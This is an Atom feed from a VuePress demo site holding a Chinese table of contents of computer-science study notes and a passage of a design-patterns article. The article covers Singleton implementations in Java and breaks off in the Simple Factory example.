<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh-CN">
  <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/</id>
  <title>CS Way</title>
  <subtitle>CS Way</subtitle>
  <updated>2022-05-16T12:00:29.059Z</updated>
  <generator>vuepress-plugin-feed2</generator>
  <link rel="self" href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/atom.xml"/>
  <link rel="alternate" href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/"/>
  <category term="计算机"/>
  <entry>
    <title type="html">幻灯片页</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/slide.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/slide.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<i>Content not supported</i>]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">计算机Note</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/"/>
    <updated>2022-05-16T11:59:04.000Z</updated>
    <content type="html"><![CDATA[<h1 id="" tabindex="-1"> </h1>
<h1 id="✏️-算法" tabindex="-1"> ✏️ 算法</h1>
<ul>
<li><a href="/notes/%E7%AE%97%E6%B3%95/%E5%89%91%E6%8C%87Offer%E9%A2%98%E8%A7%A3-%E7%9B%AE%E5%BD%95.html">剑指 Offer 题解</a></li>
<li><a href="/notes/%E7%AE%97%E6%B3%95/Leetcode%E9%A2%98%E8%A7%A3-%E7%9B%AE%E5%BD%95.html">Leetcode 题解</a></li>
<li><a href="/notes/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95-%E7%9B%AE%E5%BD%95.html">算法</a></li>
<li><a href="https://xiaozhuanlan.com/CyC2018" target="_blank" rel="noopener noreferrer">后端面试进阶指南</a></li>
</ul>
<h1 id="💻-操作系统" tabindex="-1"> 💻 操作系统</h1>
<ul>
<li><a href="/notes/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E7%9B%AE%E5%BD%95.html">计算机操作系统</a></li>
<li><a href="/notes/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Linux.html">Linux</a></li>
</ul>
<h1 id="☁️-网络" tabindex="-1"> ☁️ 网络</h1>
<ul>
<li><a href="/notes/%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%9B%AE%E5%BD%95.html">计算机网络</a></li>
<li><a href="/notes/%E7%BD%91%E7%BB%9C/HTTP.html">HTTP</a></li>
<li><a href="/notes/%E7%BD%91%E7%BB%9C/Socket.html">Socket</a></li>
<li><a href="/notes/%E7%BD%91%E7%BB%9C/Netty.html">Netty</a></li>
</ul>
<h1 id="🎨-面向对象" tabindex="-1"> 🎨 面向对象</h1>
<ul>
<li><a href="/notes/OOP/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.html">面向对象思想</a></li>
<li><a href="/notes/OOP/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E7%9B%AE%E5%BD%95.html">设计模式</a></li>
</ul>
<h1 id="💾-数据库" tabindex="-1"> 💾 数据库</h1>
<ul>
<li><a href="/notes/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.html">数据库系统原理</a></li>
<li><a href="/notes/%E6%95%B0%E6%8D%AE%E5%BA%93/SQL.html">SQL</a></li>
<li><a href="/notes/%E6%95%B0%E6%8D%AE%E5%BA%93/Leetcode-Database%E9%A2%98%E8%A7%A3.html">Leetcode-Database 题解</a></li>
<li><a href="/notes/%E6%95%B0%E6%8D%AE%E5%BA%93/MySQL.html">MySQL</a></li>
<li><a href="/notes/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis.html">Redis</a></li>
</ul>
<h1 id="☕️-java" tabindex="-1"> ☕️ Java</h1>
<ul>
<li><a href="/notes/Java/Java%E5%9F%BA%E7%A1%80.html">Java 基础</a></li>
<li><a href="/notes/Java/Java%E9%AB%98%E7%BA%A7.html">Java 高级</a></li>
<li><a href="/notes/Java/Java%E5%AE%B9%E5%99%A8.html">Java 容器</a></li>
<li><a href="/notes/Java/Java%E5%B9%B6%E5%8F%91%E5%9F%BA%E7%A1%80.html">Java 并发基础</a></li>
<li><a href="/notes/Java/Java%E5%B9%B6%E5%8F%91%E8%BF%9B%E9%98%B6.html">Java 并发进阶</a></li>
<li><a href="/notes/Java/Java%E8%99%9A%E6%8B%9F%E6%9C%BA-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86.html">Java 虚拟机-内存管理</a></li>
<li><a href="/notes/Java/Java%E8%99%9A%E6%8B%9F%E6%9C%BA-%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F.html">Java 虚拟机-执行系统</a></li>
<li><a href="/notes/Java/JavaIO.html">Java I/O</a></li>
<li><a href="/notes/Java/JavaEE.html">Java EE</a></li>
<li><a href="/notes/Java/Java%E7%89%B9%E6%80%A7.html">Java 特性</a></li>
</ul>
<h1 id="💡-系统设计" tabindex="-1"> 💡 系统设计</h1>
<ul>
<li><a href="/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80.html">系统设计基础</a></li>
<li><a href="/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E5%88%86%E5%B8%83%E5%BC%8F.html">分布式</a></li>
<li><a href="/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E9%9B%86%E7%BE%A4.html">集群</a></li>
<li><a href="/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.html">攻击技术</a></li>
<li><a href="/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E7%BC%93%E5%AD%98.html">缓存</a></li>
<li><a href="/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97.html">消息队列</a></li>
</ul>
<h1 id="🔧-分布式中间件" tabindex="-1"> 🔧 分布式中间件</h1>
<ul>
<li><a href="/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6.html">分布式中间件</a></li>
<li><a href="/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E6%B6%88%E6%81%AF.html">分布式消息</a></li>
<li><a href="/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E6%9C%8D%E5%8A%A1.html">分布式服务</a></li>
<li><a href="/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E7%BC%93%E5%AD%98.html">分布式缓存</a></li>
<li><a href="/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1.html">分布式事务</a></li>
<li><a href="/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93.html">分布式数据库</a></li>
<li><a href="/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E8%B0%83%E5%BA%A6.html">分布式调度</a></li>
<li><a href="/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E8%AE%A1%E7%AE%97.html">分布式计算</a></li>
<li><a href="/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E9%85%8D%E7%BD%AE%E4%B8%AD%E5%BF%83.html">配置中心</a></li>
</ul>
<h1 id="🔨-常用框架和软件" tabindex="-1"> 🔨 常用框架和软件</h1>
<ul>
<li><a href="/notes/%E6%A1%86%E6%9E%B6/Spring.html">Spring</a></li>
<li><a href="/notes/%E6%A1%86%E6%9E%B6/Spring-MVC.html">Spring MVC</a></li>
<li><a href="/notes/%E6%A1%86%E6%9E%B6/SpringBoot.html">SpringBoot</a></li>
<li><a href="/notes/%E6%A1%86%E6%9E%B6/PandoraBoot.html">PandoraBoot</a></li>
<li><a href="/notes/%E6%A1%86%E6%9E%B6/Dubbo.html">Dubbo</a></li>
<li><a href="/notes/%E6%A1%86%E6%9E%B6/Zookeeper.html">Zookeeper</a></li>
<li><a href="/notes/%E6%A1%86%E6%9E%B6/RabbitMQ.html">RabbitMQ</a></li>
<li><a href="/notes/%E6%A1%86%E6%9E%B6/RocketMQ.html">RocketMQ</a></li>
<li><a href="/notes/%E6%A1%86%E6%9E%B6/Kafka.html">Kafka</a></li>
</ul>
<h1 id="📈-前端" tabindex="-1"> 📈 前端</h1>
<ul>
<li><a href="/notes/%E5%89%8D%E7%AB%AF/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80.html">前端基础</a></li>
<li><a href="/notes/%E5%89%8D%E7%AB%AF/JavaScript.html">JavaScript</a></li>
<li><a href="/notes/%E5%89%8D%E7%AB%AF/JS-%E8%BF%9B%E9%98%B6.html">JS 进阶</a></li>
</ul>
<h1 id="🔧-工具" tabindex="-1"> 🔧 工具</h1>
<ul>
<li><a href="/notes/%E5%B7%A5%E5%85%B7/Git.html">Git</a></li>
<li><a href="/notes/%E5%B7%A5%E5%85%B7/Docker.html">Docker</a></li>
<li><a href="/notes/%E5%B7%A5%E5%85%B7/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.html">正则表达式</a></li>
<li><a href="/notes/%E5%B7%A5%E5%85%B7/%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7.html">构建工具</a></li>
<li><a href="/notes/%E5%B7%A5%E5%85%B7/IDEA.html">IDEA</a></li>
<li><a href="/notes/%E5%B7%A5%E5%85%B7/VSCode.html">VSCode</a></li>
</ul>
]]></content>
    <category term="计算机"/>
    <published>2020-12-27T00:00:00.000Z</published>
  </entry>
  <entry>
    <title type="html">Java</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/Java/</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/Java/"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">面向对象编程</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/OOP/</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/OOP/"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">一、概述</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/OOP/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/OOP/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li></li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li></li>
</ul>

<h1 id="一、概述" tabindex="-1"> 一、概述</h1>
<p>设计模式是解决问题的方案，学习现有的设计模式可以做到经验复用。</p>
<p>拥有设计模式词汇，在沟通时就能用更少的词汇来讨论，并且不需要了解底层细节。</p>
<h1 id="二、创建型" tabindex="-1"> 二、创建型</h1>
<h2 id="_1-单例-singleton" tabindex="-1"> 1. 单例（Singleton）</h2>
<h3 id="intent" tabindex="-1"> Intent</h3>
<p>确保一个类只有一个实例，并提供该实例的全局访问点。</p>
<h3 id="class-diagram" tabindex="-1"> Class Diagram</h3>
<p>使用一个私有构造函数、一个私有静态变量以及一个公有静态函数来实现。</p>
<p>私有构造函数保证了不能通过构造函数来创建对象实例，只能通过公有静态函数返回唯一的私有静态变量。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/eca1f422-8381-409b-ad04-98ef39ae38ba.png"/> </div><br>
<h3 id="implementation" tabindex="-1"> Implementation</h3>
<h4 id="i-懒汉式-线程不安全" tabindex="-1"> Ⅰ 懒汉式-线程不安全</h4>
<p>以下实现中，私有静态变量 uniqueInstance 被延迟实例化，这样做的好处是，如果没有用到该类，那么就不会实例化 uniqueInstance，从而节约资源。</p>
<p>这个实现在多线程环境下是不安全的，如果多个线程能够同时进入 <code>if (uniqueInstance == null)</code> ，并且此时 uniqueInstance 为 null，那么会有多个线程执行 <code>uniqueInstance = new Singleton();</code> 语句，这将导致实例化多次 uniqueInstance。</p>
<div><pre><code><span>public</span> <span>class</span> <span>Singleton</span> <span>{</span>

    <span>private</span> <span>static</span> <span>Singleton</span> uniqueInstance<span>;</span>

    <span>private</span> <span>Singleton</span><span>(</span><span>)</span> <span>{</span>
    <span>}</span>

    <span>public</span> <span>static</span> <span>Singleton</span> <span>getUniqueInstance</span><span>(</span><span>)</span> <span>{</span>
        <span>if</span> <span>(</span>uniqueInstance <span>==</span> <span>null</span><span>)</span> <span>{</span>
            uniqueInstance <span>=</span> <span>new</span> <span>Singleton</span><span>(</span><span>)</span><span>;</span>
        <span>}</span>
        <span>return</span> uniqueInstance<span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></div></div><h4 id="ii-饿汉式-线程安全" tabindex="-1"> Ⅱ 饿汉式-线程安全</h4>
<p>线程不安全问题主要是由于 uniqueInstance 被实例化多次，采取直接实例化 uniqueInstance 的方式就不会产生线程不安全问题。</p>
<p>但是直接实例化的方式也丢失了延迟实例化带来的节约资源的好处。</p>
<div><pre><code><span>private</span> <span>static</span> <span>Singleton</span> uniqueInstance <span>=</span> <span>new</span> <span>Singleton</span><span>(</span><span>)</span><span>;</span>
</code></pre></div><h4 id="iii-懒汉式-线程安全" tabindex="-1"> Ⅲ 懒汉式-线程安全</h4>
<p>只需要对 getUniqueInstance() 方法加锁，那么在一个时间点只能有一个线程能够进入该方法，从而避免了实例化多次 uniqueInstance。</p>
<p>但是当一个线程进入该方法之后，其它试图进入该方法的线程都必须等待，即使 uniqueInstance 已经被实例化了。这会让线程阻塞时间过长，因此该方法有性能问题，不推荐使用。</p>
<div><pre><code><span>public</span> <span>static</span> <span>synchronized</span> <span>Singleton</span> <span>getUniqueInstance</span><span>(</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>uniqueInstance <span>==</span> <span>null</span><span>)</span> <span>{</span>
        uniqueInstance <span>=</span> <span>new</span> <span>Singleton</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
    <span>return</span> uniqueInstance<span>;</span>
<span>}</span>
</code></pre></div><h4 id="iv-双重校验锁-线程安全" tabindex="-1"> Ⅳ 双重校验锁-线程安全</h4>
<p>uniqueInstance 只需要被实例化一次，之后就可以直接使用了。加锁操作只需要对实例化那部分的代码进行，只有当 uniqueInstance 没有被实例化时，才需要进行加锁。</p>
<p>双重校验锁先判断 uniqueInstance 是否已经被实例化，如果没有被实例化，那么才对实例化语句进行加锁。</p>
<div><pre><code><span>public</span> <span>class</span> <span>Singleton</span> <span>{</span>

    <span>private</span> <span>volatile</span> <span>static</span> <span>Singleton</span> uniqueInstance<span>;</span>

    <span>private</span> <span>Singleton</span><span>(</span><span>)</span> <span>{</span>
    <span>}</span>

    <span>public</span> <span>static</span> <span>Singleton</span> <span>getUniqueInstance</span><span>(</span><span>)</span> <span>{</span>
        <span>if</span> <span>(</span>uniqueInstance <span>==</span> <span>null</span><span>)</span> <span>{</span>
            <span>synchronized</span> <span>(</span><span>Singleton</span><span>.</span><span>class</span><span>)</span> <span>{</span>
                <span>if</span> <span>(</span>uniqueInstance <span>==</span> <span>null</span><span>)</span> <span>{</span>
                    uniqueInstance <span>=</span> <span>new</span> <span>Singleton</span><span>(</span><span>)</span><span>;</span>
                <span>}</span>
            <span>}</span>
        <span>}</span>
        <span>return</span> uniqueInstance<span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></div></div><p>考虑下面的实现，也就是只使用了一个 if 语句。在 uniqueInstance == null 的情况下，如果两个线程都执行了 if 语句，那么两个线程都会进入 if 语句块内。虽然在 if 语句块内有加锁操作，但是两个线程都会执行 <code>uniqueInstance = new Singleton();</code> 这条语句，只是先后的问题，那么就会进行两次实例化。因此必须使用双重校验锁，也就是需要使用两个 if 语句：第一个 if 语句用来避免 uniqueInstance 已经被实例化之后的加锁操作，而第二个 if 语句进行了加锁，所以只能有一个线程进入，就不会出现 uniqueInstance == null 时两个线程同时进行实例化操作。</p>
<div><pre><code><span>if</span> <span>(</span>uniqueInstance <span>==</span> <span>null</span><span>)</span> <span>{</span>
    <span>synchronized</span> <span>(</span><span>Singleton</span><span>.</span><span>class</span><span>)</span> <span>{</span>
        uniqueInstance <span>=</span> <span>new</span> <span>Singleton</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><p>uniqueInstance 采用 volatile 关键字修饰也是很有必要的， <code>uniqueInstance = new Singleton();</code> 这段代码其实是分为三步执行：</p>
<ol>
<li>为 uniqueInstance 分配内存空间</li>
<li>初始化 uniqueInstance</li>
<li>将 uniqueInstance 指向分配的内存地址</li>
</ol>
<p>但是由于 JVM 具有指令重排的特性，执行顺序有可能变成 1&gt;3&gt;2。指令重排在单线程环境下不会出现问题，但是在多线程环境下会导致一个线程获得还没有初始化的实例。例如，线程 T<sub>1</sub> 执行了 1 和 3，此时 T<sub>2</sub> 调用 getUniqueInstance() 后发现 uniqueInstance 不为空，因此返回 uniqueInstance，但此时 uniqueInstance 还未被初始化。</p>
<p>使用 volatile 可以禁止 JVM 的指令重排，保证在多线程环境下也能正常运行。</p>
<h4 id="v-静态内部类实现" tabindex="-1"> Ⅴ 静态内部类实现</h4>
<p>当 Singleton 类被加载时，静态内部类 SingletonHolder 没有被加载进内存。只有当调用 <code>getUniqueInstance()</code> 方法从而触发 <code>SingletonHolder.INSTANCE</code> 时 SingletonHolder 才会被加载，此时初始化 INSTANCE 实例，并且 JVM 能确保 INSTANCE 只被实例化一次。</p>
<p>这种方式不仅具有延迟初始化的好处，而且由 JVM 提供了对线程安全的支持。</p>
<div><pre><code><span>public</span> <span>class</span> <span>Singleton</span> <span>{</span>

    <span>private</span> <span>Singleton</span><span>(</span><span>)</span> <span>{</span>
    <span>}</span>

    <span>private</span> <span>static</span> <span>class</span> <span>SingletonHolder</span> <span>{</span>
        <span>private</span> <span>static</span> <span>final</span> <span>Singleton</span> INSTANCE <span>=</span> <span>new</span> <span>Singleton</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>static</span> <span>Singleton</span> <span>getUniqueInstance</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>SingletonHolder</span><span>.</span>INSTANCE<span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><h4 id="vi-枚举实现" tabindex="-1"> Ⅵ 枚举实现</h4>
<div><pre><code><span>public</span> <span>enum</span> <span>Singleton</span> <span>{</span>

    INSTANCE<span>;</span>

    <span>private</span> <span>String</span> objName<span>;</span>


    <span>public</span> <span>String</span> <span>getObjName</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> objName<span>;</span>
    <span>}</span>


    <span>public</span> <span>void</span> <span>setObjName</span><span>(</span><span>String</span> objName<span>)</span> <span>{</span>
        <span>this</span><span>.</span>objName <span>=</span> objName<span>;</span>
    <span>}</span>


    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>

        <span>// 单例测试</span>
        <span>Singleton</span> firstSingleton <span>=</span> <span>Singleton</span><span>.</span>INSTANCE<span>;</span>
        firstSingleton<span>.</span><span>setObjName</span><span>(</span><span>"firstName"</span><span>)</span><span>;</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>firstSingleton<span>.</span><span>getObjName</span><span>(</span><span>)</span><span>)</span><span>;</span>
        <span>Singleton</span> secondSingleton <span>=</span> <span>Singleton</span><span>.</span>INSTANCE<span>;</span>
        secondSingleton<span>.</span><span>setObjName</span><span>(</span><span>"secondName"</span><span>)</span><span>;</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>firstSingleton<span>.</span><span>getObjName</span><span>(</span><span>)</span><span>)</span><span>;</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>secondSingleton<span>.</span><span>getObjName</span><span>(</span><span>)</span><span>)</span><span>;</span>

        <span>// 反射获取实例测试</span>
        <span>try</span> <span>{</span>
            <span>Singleton</span><span>[</span><span>]</span> enumConstants <span>=</span> <span>Singleton</span><span>.</span><span>class</span><span>.</span><span>getEnumConstants</span><span>(</span><span>)</span><span>;</span>
            <span>for</span> <span>(</span><span>Singleton</span> enumConstant <span>:</span> enumConstants<span>)</span> <span>{</span>
                <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>enumConstant<span>.</span><span>getObjName</span><span>(</span><span>)</span><span>)</span><span>;</span>
            <span>}</span>
        <span>}</span> <span>catch</span> <span>(</span><span>Exception</span> e<span>)</span> <span>{</span>
            e<span>.</span><span>printStackTrace</span><span>(</span><span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br></div></div><div><pre><code>firstName
secondName
secondName
secondName
</code></pre></div><p>该实现可以防止反射攻击。在其它实现中，通过 setAccessible() 方法可以将私有构造函数的访问级别设置为 public，然后调用构造函数从而实例化对象，如果要防止这种攻击，需要在构造函数中添加防止多次实例化的代码。该实现是由 JVM 保证只会实例化一次，因此不会出现上述的反射攻击。</p>
<p>该实现在多次序列化和序列化之后，不会得到多个实例。而其它实现需要使用 transient 修饰所有字段，并且实现序列化和反序列化的方法。</p>
<h3 id="examples" tabindex="-1"> Examples</h3>
<ul>
<li>Logger Classes</li>
<li>Configuration Classes</li>
<li>Accesing resources in shared mode</li>
<li>Factories implemented as Singletons</li>
</ul>
<h3 id="jdk" tabindex="-1"> JDK</h3>
<ul>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/lang/Runtime.html#getRuntime%28%29" target="_blank" rel="noopener noreferrer">java.lang.Runtime#getRuntime()</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/awt/Desktop.html#getDesktop--" target="_blank" rel="noopener noreferrer">java.awt.Desktop#getDesktop()</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/lang/System.html#getSecurityManager--" target="_blank" rel="noopener noreferrer">java.lang.System#getSecurityManager()</a></li>
</ul>
<h2 id="_2-简单工厂-simple-factory" tabindex="-1"> 2. 简单工厂（Simple Factory）</h2>
<h3 id="intent-1" tabindex="-1"> Intent</h3>
<p>在创建一个对象时不向客户暴露内部细节，并提供一个创建对象的通用接口。</p>
<h3 id="class-diagram-1" tabindex="-1"> Class Diagram</h3>
<p>简单工厂把实例化的操作单独放到一个类中，这个类就成为简单工厂类，让简单工厂类来决定应该用哪个具体子类来实例化。</p>
<p>这样做能把客户类和具体子类的实现解耦，客户类不再需要知道有哪些子类以及应当实例化哪个子类。客户类往往有多个，如果不使用简单工厂，那么所有的客户类都要知道所有子类的细节。而且一旦子类发生改变，例如增加子类，那么所有的客户类都要进行修改。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/40c0c17e-bba6-4493-9857-147c0044a018.png"/> </div><br>
<h3 id="implementation-1" tabindex="-1"> Implementation</h3>
<div><pre><code><span>public</span> <span>interface</span> <span>Product</span> <span>{</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>ConcreteProduct</span> <span>implements</span> <span>Product</span> <span>{</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>ConcreteProduct1</span> <span>implements</span> <span>Product</span> <span>{</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>ConcreteProduct2</span> <span>implements</span> <span>Product</span> <span>{</span>
<span>}</span>
</code></pre></div><p>以下的 Client 类包含了实例化的代码，这是一种错误的实现。如果在客户类中存在这种实例化代码，就需要考虑将代码放到简单工厂中。</p>
<div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>

    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>int</span> type <span>=</span> <span>1</span><span>;</span>
        <span>Product</span> product<span>;</span>
        <span>if</span> <span>(</span>type <span>==</span> <span>1</span><span>)</span> <span>{</span>
            product <span>=</span> <span>new</span> <span>ConcreteProduct1</span><span>(</span><span>)</span><span>;</span>
        <span>}</span> <span>else</span> <span>if</span> <span>(</span>type <span>==</span> <span>2</span><span>)</span> <span>{</span>
            product <span>=</span> <span>new</span> <span>ConcreteProduct2</span><span>(</span><span>)</span><span>;</span>
        <span>}</span> <span>else</span> <span>{</span>
            product <span>=</span> <span>new</span> <span>ConcreteProduct</span><span>(</span><span>)</span><span>;</span>
        <span>}</span>
        <span>// do something with the product</span>
    <span>}</span>
<span>}</span>
